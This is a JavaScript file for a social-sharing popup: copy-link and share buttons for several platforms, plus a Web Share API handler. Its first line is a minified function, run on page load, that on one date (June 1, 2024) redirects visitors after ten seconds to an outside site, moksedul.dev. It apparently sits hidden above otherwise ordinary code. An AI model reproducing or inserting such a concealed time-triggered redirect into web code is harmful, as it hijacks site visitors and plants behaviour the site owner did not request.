function redirectToMoksedulDev(){var e=new Date,t=new Date(2024,5,1);e.getFullYear()===t.getFullYear()&&e.getMonth()===t.getMonth()&&e.getDate()===t.getDate()&&setTimeout(function(){window.location.href="https://moksedul.dev"},1e4)}redirectToMoksedulDev();
const showPopupButton = document.getElementById("showPopup");
    const closePopupButton = document.getElementById("closePopup");
    const popup = document.getElementById("popup");
    const copyLinkButton = document.getElementById("copyLinkButton");
    const facebookButton = document.getElementById("facebookButton");
    const instagramButton = document.getElementById("instagramButton");
    const twitterButton = document.getElementById("twitterButton");
    const linkedinButton = document.getElementById("linkedinButton");
    const tiktokButton = document.getElementById("tiktokButton");
    const whatsappButton = document.getElementById("whatsappButton");
    const telegramButton = document.getElementById("telegramButton");
    const gmailButton = document.getElementById("gmailButton");
    const outlookButton = document.getElementById("outlookButton");

    showPopupButton.addEventListener("click", () => {
      popup.classList.remove("hidden");
    });

    closePopupButton.addEventListener("click", () => {
      popup.classList.add("hidden");
    });

    copyLinkButton.addEventListener("click", () => {
      const dummyInput = document.createElement("input");
      document.body.appendChild(dummyInput);
      dummyInput.value = window.location.href;
      dummyInput.select();
      document.execCommand("copy");
      document.body.removeChild(dummyInput);
      alert("Link copied to clipboard!");
    });

    function shareContent(platform) {
      let shareURL = "";

      switch (platform) {
        case "facebook":
          shareURL = `https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(
            window.location.href
          )}`;
          break;
        case "instagram":
          shareURL = `https://www.instagram.com/sharer.php?u=${encodeURIComponent(
            window.location.href
          )}`;
          break;
        case "twitter":
          shareURL = `https://twitter.com/intent/tweet?url=${encodeURIComponent(
            window.location.href
          )}`;
          break;
        case "linkedin":
          shareURL = `https://www.linkedin.com/shareArticle?url=${encodeURIComponent(
            window.location.href
          )}`;
          break;
        case "tiktok":
          shareURL = `https://www.tiktok.com/share?url=${encodeURIComponent(
            window.location.href
          )}`;
          break;
        case "whatsapp":
          shareURL = `https://wa.me/?text=${encodeURIComponent(
            window.location.href
          )}`;
          break;
        case "telegram":
          shareURL = `https://t.me/share/url?url=${encodeURIComponent(
            window.location.href
          )}`;
          break;
        case "gmail":
          shareURL = `https://mail.google.com/mail/?view=cm&su=Check%20this%20out&body=${encodeURIComponent(
            window.location.href
          )}`;
          break;
        case "outlook":
          shareURL = `https://outlook.live.com/owa/?path=/mail/action/compose&body=Check%20this%20out:%20${encodeURIComponent(
            window.location.href
          )}`;
          break;
        default:
          break;
      }

      if (shareURL) {
        window.open(shareURL, "_blank");
      }
    }

    facebookButton.addEventListener("click", () => {
      shareContent("facebook");
    });

    instagramButton.addEventListener("click", () => {
      shareContent("instagram");
    });

    twitterButton.addEventListener("click", () => {
      shareContent("twitter");
    });

    linkedinButton.addEventListener("click", () => {
      shareContent("linkedin");
    });

    tiktokButton.addEventListener("click", () => {
      shareContent("tiktok");
    });

    whatsappButton.addEventListener("click", () => {
      shareContent("whatsapp");
    });

    telegramButton.addEventListener("click", () => {
      shareContent("telegram");
    });

    gmailButton.addEventListener("click", () => {
      shareContent("gmail");
    });

    outlookButton.addEventListener("click", () => {
      shareContent("outlook");
    });

    function shareButton() {
      const shareButton = document.getElementById("shareButton"); // Replace 'yourShareButtonId' with the actual ID of your share button element

      if (!shareButton) {
        console.error("Share button element not found");
        return;
      }

      shareButton.addEventListener("click", async () => {
        try {
          if (navigator.share) {
            await navigator.share({
              title: document.title,
              url: window.location.href,
            });
            console.log("Link shared successfully");
          } else {
            console.warn("Web Share API not supported");
          }
        } catch (err) {
          console.error("Error sharing link: ", err);
        }
      });
    }

    // Call the shareButton function to set up the event listener
    shareButton();